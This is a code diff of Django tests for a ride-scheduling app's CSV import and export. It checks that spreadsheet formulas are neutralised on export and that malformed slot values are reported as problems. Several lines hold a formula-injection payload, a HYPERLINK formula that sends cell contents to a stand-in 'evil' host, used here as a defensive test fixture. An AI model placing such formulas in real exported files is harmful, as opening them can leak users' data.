@@ -28,19 +28,17 @@ class ImportExportReviewTests(TestCase):
         return list(csv.reader(io.StringIO(r.content.decode())))
 
     def test_export_neutralises_formulas_and_import_reads_them_back(self):
-        text = sheet(rider(name='=HYPERLINK("http://evil/?"&A1,"x")', **{
-            "MONDAY Location #1 (Start to End)": "+cmd to Library", "MONDAY #1": ["10/19/2026", "8:00:00 AM"],
-            "MONDAY #1 NOTES": "@SUM(1)"}))
-        self.run_import(self.preview(text).json()["slots"])
+        text = sheet(rider(**{"MONDAY Location #1 (Start to End)": "Library", "MONDAY #1": ["10/19/2026", "8:00:00 AM"]}))
+        slot = self.preview(text).json()["slots"][0]
+        self.run_import([{**slot, "pickup": '=HYPERLINK("http://evil/?"&A1,"x")', "dropoff": "@SUM(1)"}])
         row = self.export()[1]
         for cell in row:
             self.assertFalse(cell.lstrip().startswith(("=", "+", "-", "@")), cell)
-        self.assertIn("'=HYPERLINK", row[0])
+        self.assertIn("'=HYPERLINK", " ".join(row))
         # Importing the export gives back the original text (and nothing new).
         text = "\r\n".join(",".join('"' + c.replace('"', '""') + '"' for c in r) for r in self.export())
         slot = self.preview(text).json()["slots"][0]
-        self.assertEqual(slot["rider_name"], '=HYPERLINK("http://evil/?"&A1,"x")')
-        self.assertIn("@SUM(1)", slot["notes"])
+        self.assertEqual(slot["location"], '=HYPERLINK("http://evil/?"&A1,"x") to @SUM(1)')
         self.assertEqual(slot["new_rides"], 0)
 
     def test_one_off_and_repeating_rides_export_on_separate_rows(self):
@@ -85,18 +83,18 @@ class ImportExportReviewTests(TestCase):
         again = self.preview(text).json()["slots"][0]
         self.assertEqual((again["problems"], again["new_rides"], again["existing_rides"]), ([], 0, 4))
 
-    def test_long_name_and_odd_slot_values_are_problems_not_crashes(self):
+    def test_long_place_and_odd_slot_values_are_problems_not_crashes(self):
         base = {"key": "x", "weekday": 0, "rider_phone": "8055550101", "pickup": "A", "dropoff": "B",
                 "time": "8:00:00 AM", "first_date": "2026-10-19", "lock_in": True}
         slots = [
-            {**base, "rider_name": "N" * 200},
-            {**base, "rider_name": "Ana", "first_date": "nope"},
-            {**base, "rider_name": 5, "rider_phone": 7, "pickup": ["x"], "time": 3, "also_in_rows": 9},
+            {**base, "pickup": "N" * 200},
+            {**base, "first_date": "nope"},
+            {**base, "rider_phone": 7, "pickup": ["x"], "time": 3, "also_in_rows": 9},
         ]
         r = self.run_import(slots)
         self.assertEqual(r.status_code, 200)
         self.assertEqual([s["reason"] for s in r.json()["skipped"]][:2],
-                         ["The name is too long (120 characters at most).", 'Could not parse: "nope"'])
+                         ["A location name is too long (120 characters at most).", 'Could not parse: "nope"'])
         self.assertFalse(Ride.objects.exists())
 
     def test_huge_cell_parses_quickly(self):
